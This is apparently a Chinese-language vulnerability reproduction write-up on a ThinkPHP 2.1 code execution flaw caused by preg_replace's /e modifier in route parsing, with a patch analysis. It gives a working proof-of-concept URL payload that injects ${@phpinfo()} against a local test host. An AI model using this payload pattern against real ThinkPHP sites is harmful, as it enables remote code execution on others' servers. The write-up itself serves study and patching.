categories:
- cve复现
tags:
- cve复现
title: ThinkPHP 2.x任意代码执行漏洞
---
# ThinkPHP 2.x任意代码执行漏洞



## 影响范围

thinkphp 2.1

官网的thinkphp 2.2已经修复了



## 漏洞复现

漏洞位置

![image154](https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png)

路由解析处

`$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));`

这个preg_replace有点古怪,没有用`/`来包围搜索模式而是用`@`,查找关于preg的文档发现

>当使用 PCRE 函数的时候，模式需要由*分隔符*闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。   
>
>  经常使用的分隔符是正斜线(*/*)、hash符号(*#*)   以及取反符号(*~*)。下面的例子都是使用合法分隔符的模式。    
>
>```
>/foo bar/
>#^[^0-9]$#
>+php+
>%[a-zA-Z0-9_-]%
>```

替换常量,这个就变成了

`preg_replace('@(\w+)/([^\/\/]+)@e', '$var[\'\\1\']="\\2";', implode('/',$paths));`

查看preg_replace的介绍发现

>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：'、"、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误(比如： 'strlen(\'$1\')+strlen("$2")')。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。 

执行`$replacement`(第二个参数)前,会先替换掉引用

我们可以看到,`$replacement`用双引号来包围引用`\\2`,会导致命令执行



构造

```php
$paths=array(
	'xxxx',
    '${phpinfo()}'
);
```

则`'$var[\'\\1\']="\\2";'`变为`$var['xxxx']="${phpinfo()}";`

从而导致命令执行

于是构造payload

` [http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/${@phpinfo()}) `



## 补丁分析

![image1293](https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png)



用单引号来包围所有引用就可以避免命令执行



## 参考

 https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce 

